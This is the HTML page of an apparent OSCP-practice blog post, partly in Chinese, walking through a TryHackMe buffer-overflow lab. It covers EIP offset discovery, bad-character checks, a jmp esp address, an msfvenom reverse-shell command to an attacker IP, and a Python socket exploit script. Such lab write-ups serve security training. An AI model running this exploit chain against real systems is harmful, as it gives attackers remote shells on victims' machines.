@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="OSCP、tryhackme、bufferoverflow" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Xiaopan233 Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="临近  OSCP Exam了，做点 bufferoverflow 的靶机练练手。之前无意间在 twiiter 上看到了一个靶场，有 bof。遂来练手。顺便也练练 Report 的编写。   靶机地址： https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;bufferoverflowprep   这种是最基本的 BOF，没有保护什么的，都是走个流程就差不多了。 ps: 中途吃了个饭，重启了 lab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCP report 练手之 - tryhackme bufferoverflow">
+<meta property="og:url" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/index.html">
+<meta property="og:site_name" content="Xiaopan233 Blog">
+<meta property="og:description" content="临近  OSCP Exam了，做点 bufferoverflow 的靶机练练手。之前无意间在 twiiter 上看到了一个靶场，有 bof。遂来练手。顺便也练练 Report 的编写。   靶机地址： https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;bufferoverflowprep   这种是最基本的 BOF，没有保护什么的，都是走个流程就差不多了。 ps: 中途吃了个饭，重启了 lab">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/1.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/2.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/3.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/4.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/5.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/6.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/7.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/8.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/9.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/10.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/11.png">
+<meta property="og:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/12.png">
+<meta property="article:published_time" content="2021-02-14T09:53:02.000Z">
+<meta property="article:modified_time" content="2021-02-14T13:24:45.455Z">
+<meta property="article:author" content="Xiaopan233">
+<meta property="article:tag" content="OSCP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/"/>
+
+
+
+
+
+  <title>OSCP report 练手之 - tryhackme bufferoverflow | Xiaopan233 Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xiaopan233 Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/atom.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/2020/01/01/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+<script>
+  var server_url = "http://127.0.0.1/blog_v1/blog_v1.php";
+</script>
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiaopan233 Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">OSCP report 练手之 - tryhackme bufferoverflow</h1>
+        
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-14T17:53:02+08:00">
+                2021-02-14
+              </time>
+            
+
+            
+
+            
+          </span>
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/OSCP/" itemprop="url" rel="index">
+                    <span itemprop="name">OSCP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+          
+            
+          
+
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>临近  OSCP Exam了，做点 bufferoverflow 的靶机练练手。之前无意间在 twiiter 上看到了一个靶场，有 bof。遂来练手。顺便也练练 Report 的编写。</p>
+<br>
+
+<p>靶机地址：</p>
+<p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/bufferoverflowprep">https://tryhackme.com/room/bufferoverflowprep</a></p>
+<br>
+
+<p>这种是最基本的 BOF，没有保护什么的，都是走个流程就差不多了。</p>
+<p>ps:</p>
+<p>中途吃了个饭，重启了 lab machine。导致前后机器 ip 不一致了，不要在意。。。</p>
+<span id="more"></span>
+
+<p><strong>Snooping around the target</strong></p>
+<br>
+
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/1.png" style="width:500px">
+
+<br>
+
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/2.png" style="width:500px">
+
+<br>
+
+<p><strong>Create a python script as exp. use msf-pattern_create to generate a string.</strong></p>
+<p>a@kali:~/Desktop/bof$ <span style="color:blue">msf-pattern_create -l 1000</span></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;PAYLOAD&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;10.10.65.218&#x27;</span>, <span class="number">1337</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.send(<span class="string">&#x27;OVERFLOW2 &#x27;</span>+payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><strong>Note the value of EIP.</strong></p>
+<br>
+
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/3.png" style="width:500px">
+
+<br>
+
+<p><strong>Use msf-pattern_offset to get the “eip” offset</strong></p>
+<p>a@kali:~/Desktop/bof$ <span style="color:blue">msf-pattern_offset -l 1000 -q 76413176</span></p>
+<p>[*] Exact match at offset <span style="color:red">634</span></p>
+<br>
+
+<p><strong>ensure “eip” offset</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/4.png" style="width:500px">
+
+<br>
+
+<p><strong>check bad chars.Delete “<span style="color:red">\x00,\x0a,\x0d</span> first”</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF&quot;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/5.png" style="width:500px">
+
+<br>
+
+<p><strong>copy these chars,edit these like following (You can do it easily with “sublime text”):</strong></p>
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/6.png" style="width:500px">
+
+<br>
+
+<p><strong>create a python script to auto check bad char:</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/xiaopan233/OSCP-Script/blob/main/bof/badchars_check.py">https://github.com/xiaopan233/OSCP-Script/blob/main/bof/badchars_check.py</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rightChars = <span class="string">&quot;\xXX\xXX\xXX......&quot;</span>  <span class="comment">#the chars in python payload</span></span><br><span class="line">memeryChars = <span class="string">&quot;\xXX\xXX\xXX......&quot;</span> <span class="comment">#chars from immunity debugger hex dump</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(memeryChars)):</span><br><span class="line">	<span class="keyword">if</span> rightChars[i] != memeryChars[i]:</span><br><span class="line">		print(<span class="string">&quot;[-] Find bad char!&quot;</span>)</span><br><span class="line">		print(<span class="string">&quot;[-] Current char: &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(rightChars[i])))</span><br><span class="line">		<span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">			print(<span class="string">&quot;[-] Previous char: &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(rightChars[i-<span class="number">1</span>])))</span><br><span class="line">		flag = <span class="number">0</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">	print(<span class="string">&quot;[+] Not Find bad char!&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/7.png" style="width:600px">
+
+<br>
+
+<p><strong>Find a bad char “<span style="color:red">\x23</span>“</strong></p>
+<p><strong>from payload delete char “<span style="color:red">\x23</span>“.</strong></p>
+<br>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0B\x0C\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20\x21\x22\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF&quot;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><strong>Then resend payload again.Repeat above process.Until  detect no bad char.</strong></p>
+<br>
+
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/8.png" style="width:500px">
+
+<br>
+
+<p><strong>all detected bad chars following:</strong></p>
+<p><span style="color:red">\x23, \x3c, \x83, \xba</span></p>
+<p><strong>Next step.Find jmp esp address.</strong></p>
+<p><strong>type command “<span style="color:blue">!mona modules</span>“ to detect all modules.</strong></p>
+<p><strong>We should note the dll which without protection.For me the best dll is from the vulnnerable application.</strong></p>
+<br>
+
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/9.png" style="width:800px">
+
+<br>
+
+<p><strong>get the opcode of “jmp esp”</strong></p>
+<p>a@kali:~/Desktop$ <span style="color:blue">msf-nasm_shell </span><br>nasm &gt; <span style="color:blue">jmp esp</span><br>00000000  <span style="color:red">FFE4</span>              jmp esp</p>
+<p><strong>not only “jmp esp”,but there also are “jmp ebp”,”call esp”,“jmp eax” etc.</strong></p>
+<p>nasm &gt; <span style="color:blue">jmp ebp</span><br>00000000  <span style="color:red">FFE5</span>              jmp ebp<br>nasm &gt; <span style="color:blue">call esp</span><br>00000000  <span style="color:red">FFD4</span>              call esp<br>nasm &gt; <span style="color:blue">jmp eax</span><br>00000000  <span style="color:red">FFE0</span>              jmp eax</p>
+<p><strong>Note that: use diffrent opcode, the shellcode location we put is diffrent too.</strong></p>
+<p><strong>Here I use the first dll module “essfunc.dll”.head over to search the address of “jmp esp” opcode</strong></p>
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/10.png" style="width:500px">
+
+<br>
+
+<p><strong>We head over to test address “<span style="color:red">0x625011af</span>“.</strong></p>
+<p><strong>“jmp esp” will change eip to the address where esp pointed.</strong></p>
+<p><strong>We can put some “<span style="color:red">\x90</span>“ after “jmp esp” address in our payload to verify if it work.</strong></p>
+<p><strong>change python payload to following:</strong></p>
+<br>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;\xaf\x11\x50\x62&quot;</span>+<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span> <span class="comment">#note that return address should be reverse.0x625011af should be 0xaf115062</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Check if  it work in immunity debugger:</strong></p>
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/11.png" style="width:800px">
+
+<br>
+
+<p><strong>It worked!</strong></p>
+<p><strong>Use msfvenom to generate shellcode.</strong></p>
+<p><strong>command:</strong></p>
+<p><span style="color:blue">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.132.252 LPORT=443 -f python -b “\x00\x0a\x0d\x23\x3c\x83\xba”</span></p>
+<br>
+
+<p><strong>modify our exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">......  <span class="comment"># here are the shellcode which generated by msfvenom</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">634</span>+<span class="string">&quot;\xaf\x11\x50\x62&quot;</span>+<span class="string">&quot;\x90&quot;</span>*<span class="number">32</span>+buf  <span class="comment">#make sure there is some nop between shellcode and return address</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;10.10.15.141&#x27;</span>, <span class="number">1337</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.send(<span class="string">&#x27;OVERFLOW2 &#x27;</span>+payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<img src="/2021/02/14/2021-02-14-tryhackme-bufferoverflowprep-oscp-md/12.png" style="width:800px">
+
+<br>
+
+<p><strong>BOOM!!</strong></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/OSCP/" rel="tag"># OSCP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/11/2021-02-11-vulnhub-deve-impro-oscp/" rel="next" title="OSCP report 练手之 - vulnhub development-improved">
+                <i class="fa fa-chevron-left"></i> OSCP report 练手之 - vulnhub development-improved
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/02/27/2021-02-27-java-copy-object/" rel="prev" title="Java笔记(1) - 变量值引用和拷贝">
+                Java笔记(1) - 变量值引用和拷贝 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xiaopan233" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://forum.butian.net/people/483" target="_blank" title="奇安信攻防社区">
+                      
+                        <i class="fa fa-fw fa-globe"></i>奇安信攻防社区</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.anquanke.com/member.html?memberId=144071" target="_blank" title="安全客">
+                      
+                        <i class="fa fa-fw fa-globe"></i>安全客</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/author/xiaopan233" target="_blank" title="Freebuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Freebuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/xiaopan233/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hui3c.club/" title="Hui3c 窝" target="_blank">Hui3c 窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.noerrorp.com/" title="YouGe的技术笔记" target="_blank">YouGe的技术笔记</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jingqingg.com/" title="惊青の小窝" target="_blank">惊青の小窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.luolingjiang.com/" title="洛翎酱的小窝" target="_blank">洛翎酱的小窝</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiaopan233</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
